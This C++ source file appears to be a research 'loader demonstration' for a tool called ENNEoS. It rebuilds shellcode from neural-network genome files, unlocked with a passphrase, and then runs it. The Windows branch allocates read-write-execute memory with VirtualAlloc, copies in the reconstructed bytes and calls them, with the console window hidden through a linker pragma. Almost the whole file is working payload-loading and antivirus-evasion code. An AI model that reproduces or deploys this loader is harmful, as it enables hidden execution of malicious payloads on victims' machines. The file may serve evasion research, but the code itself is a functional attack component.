// ENNEoS loader demonstration
// Loads neural network genomes created
// by the ENNEoS encoder
//
// For testing the encoding of shellcode in neural networks
//
// Drew Kirkpatrick, drew.kirkpatrick@gmail.com


#include <iostream>
#include <fstream>
#include <string>
#include <algorithm>

#include "genotype.h"
#include "phenotype.h"
#include "CInnovation.h"
#include "shellybot.h"


#define WINDOWS
//#define DEBUG



// For testing, pull over the
// normal shellcode, not from teh neural net
#ifdef DEBUG
// For testing, pull the shellcode in to compare the outputs
// make sure that the neural net is really output what you think it
// is.
#include "encodedOutput.h"
#endif

const string genomeDataDir  = "../enneosEncoder/output/";
const string genomeDataFile = "shellcodeChunkIndex.dat";




struct chunkData
{
    int    chunkIndex;
    string chunkFileName;
};

#ifdef WINDOWS
#include <windows.h>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#endif


using namespace std;

string passphrase;


// Parses command line arguments passed to
// the program on startup
void parseArguments(int argc, char *argv[])
{
    switch (argc)
    {
    case 2:
        passphrase = argv[1];
        cout<<"Using passphrase: "<<passphrase<<endl;
        break;
    default:
        cout<<"Usage: "<<endl;
        cout<<"./enneosLoader [PASSPHRASE]"<<endl;
        exit(1);
    }
}





int main(int argc, char *argv[])
{
    cout << "Running ENNEoS Loader..." << endl;
    parseArguments(argc, argv);


    string datFile = genomeDataDir + genomeDataFile;

    ifstream genomeDataFileStream;
    genomeDataFileStream.open(datFile, ios::in);

    if (genomeDataFileStream.fail())
    {
        cout<<"Failed to open genome data file"<<endl;
        exit(1);
    }
    else
    {
        cout<<"Genome data file opened."<<endl;
    }

    vector <chunkData> genomeDataVec;

    while (!genomeDataFileStream.eof())
    {
        string index, filename, genomeID_a, genomeID_b, label;

        chunkData genome;
        getline(genomeDataFileStream, index, ',');
        getline(genomeDataFileStream, filename, ',');
        getline(genomeDataFileStream, genomeID_a, ',');
        getline(genomeDataFileStream, genomeID_b, ',');
        getline(genomeDataFileStream, label);

        genome.chunkIndex    = atoi(index.c_str());
        genome.chunkFileName = filename;

        // This weeds out the last read which is empty. The size of the string will be 0
        if (index.size() > 0)
        {
            // Whack the space at the begging of the name, and push the struct
            // into the vector
            genome.chunkFileName.erase(genome.chunkFileName.begin());
            genomeDataVec.push_back(genome);
        }
    }

    genomeDataFileStream.close();

    for (int i = 0; i < genomeDataVec.size(); i++)
    {
        cout<<"Chunk index: "<<genomeDataVec[i].chunkIndex<<", dna filename: "<<genomeDataVec[i].chunkFileName<<endl;
    }

    cout<<"Size of genome vector: "<<genomeDataVec.size()<<endl;



    // Ok, let's make some brains
    string     genomeFileName;

    CGenome    genome;
    CNeuralNet *brain;
    ShellyBot  neuroBot;

    vector <unsigned char> brainOutputs;
    vector <unsigned char> reconstructedShellcode;

    cout<<"Pulling shellcode from brains..."<<endl;

    for (int i = 0; i < genomeDataVec.size(); i++)
    {
        genomeFileName = genomeDataDir + genomeDataVec[i].chunkFileName;
       // cout<<"About to open genome file name: "<<genomeFileName<<endl;

        genome.ReadGenomeFromFile(genomeFileName);

        brain = genome.CreatePhenotype();
        neuroBot.insertNewBrain(brain);

        // Input the passphrase to the neural network
        neuroBot.setBrainInputs(passphrase);

        // Run the update, and get the neural net outputs
        neuroBot.update();
        neuroBot.getBrainCharOutputs(brainOutputs);

        //cout<<"Box index: "<<i<<", char vector size: "<<brainOutputs.size()<<endl;

        for (unsigned int j = 0; j < brainOutputs.size(); j++)
        {
            cout<<hex<<(int)brainOutputs.at(j)<<endl;
            reconstructedShellcode.push_back(brainOutputs.at(j));
        }
    }

    cout<<dec<<"Size of reconstructed shellcode vector is: "<<reconstructedShellcode.size()<<endl;

    char *shellCode = new char[reconstructedShellcode.size()];


#ifdef DEBUG
    // cout<<"Starting side by side comparison: "<<endl;

    for (unsigned int i = 0; i < __EncodedBinaryData_len; i++)
    {
        if (__EncodedBinaryData[i] != reconstructedShellcode.at(i))
        {
            cout<<"** Mismatch at: "<<i<<endl;
            cout<<"-- orig:   "<<(int)__EncodedBinaryData[i]<<endl;
            cout<<"-- neural: "<<(int)reconstructedShellcode.at(i)<<endl;
        }
    }
#endif


    for (unsigned int i = 0; i < reconstructedShellcode.size(); i++)
    {
        shellCode[i] = reconstructedShellcode.at(i);
    }


    cout<<"About to execute shellcode..."<<endl;
#ifdef WINDOWS
    // Allocating memory with EXECUTE writes
    void *exec = VirtualAlloc(0, reconstructedShellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copying deciphered shellcode into memory as a function
    memcpy(exec, shellCode, reconstructedShellcode.size());


    // Call the shellcode
    ((void(*)())exec)();
#endif

#ifdef LINUX
    char clearText[sizeof(__EncodedBinaryData)];

    for (int i = 0; i < __EncodedBinaryData_len; i++)
    {
        clearText[i] = __EncodedBinaryData[i];
    }

    cout<<".............."<<endl;

    char code[] = \
    "\x90\x90\x90\x90\x90\x90\x90";

    int (*ret)();
    ret = code;
    ret();
//    int (*ret)() = (int(*)())code;
//    ret();


//    (*(void(*)(void))code)();

//   int (*ret)() = (int(*)())code;

//   ret();

     ((void (*)())code)();

 //   (*(void(*)()) code)();
#endif


    cout<<"Done executing shellcode..."<<endl;

    delete[] shellCode;
    cout<<"Carry on."<<endl;


    return 0;
}
